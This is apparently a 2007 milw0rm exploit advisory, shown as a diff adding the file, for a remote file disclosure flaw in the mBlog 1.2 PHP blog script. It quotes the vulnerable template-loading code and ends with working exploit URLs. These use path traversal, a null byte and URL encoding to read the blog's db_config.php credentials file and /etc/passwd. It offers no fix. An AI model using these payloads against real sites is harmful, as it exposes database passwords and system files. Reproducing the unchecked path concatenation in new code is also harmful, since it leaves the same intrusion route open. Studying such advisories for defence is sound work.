@@ -1,0 +1,56 @@
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:                                                                             :
+:  vuln.: mBlog 1.2 Remote File Disclosure Vulnerability                      :
+:  script info and download: http://www.c97.net/dl/index.php?act=view&id=8    :
+:  no dork for s-kiddie [;                                                    :
+:                                                                             :
+:  author: irk4z[at]yahoo.pl                                                  :
+:  greets to: str0ke, wacky, wszystkich polakÃ³w ;]                            :
+:                                                                             :
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+# code:
+
+  ./includes/tpl.php, 41-56:
+    ...
+41   // load_tpl
+42   // loding a template file into a varible.
+43   // use quick_tpl to display template
+44  function load_tpl ($path)
+45  {
+46	  $tpl = '';
+47	  global $tpl_block;
+48
+49	  if (substr ($path, -4) == '.tpl')
+50	  {
+51		  if (strpos (Cur_Url (), 'includes%2F') OR strpos (Cur_Url (), 'admin%2F') OR strpos (Cur_Url (), 'members%2F')) $path = '../'.$path;
+52		  if (!file_exists ($path)) die ("<B>Template $path not found! Contact webmaster.</B>");
+53		  $fp = fopen($path,'r');
+54		  while(!feof($fp)) $tpl .= fgets($fp,4096);
+55		  fclose ($fp);
+56	  }
+    ...
+
+load_tpl() 'loading a template file into a varible.' ;]
+
+
+  ./index.php, 24-30:
+    ...
+24   // proses cmd
+25   switch ($mode)
+26   {
+27	  case 'page':
+28	   $txt['main_body'] = quick_tpl (load_tpl ($config['skin']."/$page.tpl"), 0);
+29	   flush_tpl ();
+30	  break;
+    ...
+	
+file disclosure in $page :*
+
+# exploit:
+
+(%69%6E%63%6C%75%64%65%73 = includes)
+http://[host]/[path]/index.php?mode=page&page=../../%69%6E%63%6C%75%64%65%73/db_config.php%00
+http://[host]/[path]/index.php?mode=page&page=../../../../../../../../etc/passwd%00
+
+# milw0rm.com [2007-12-21]
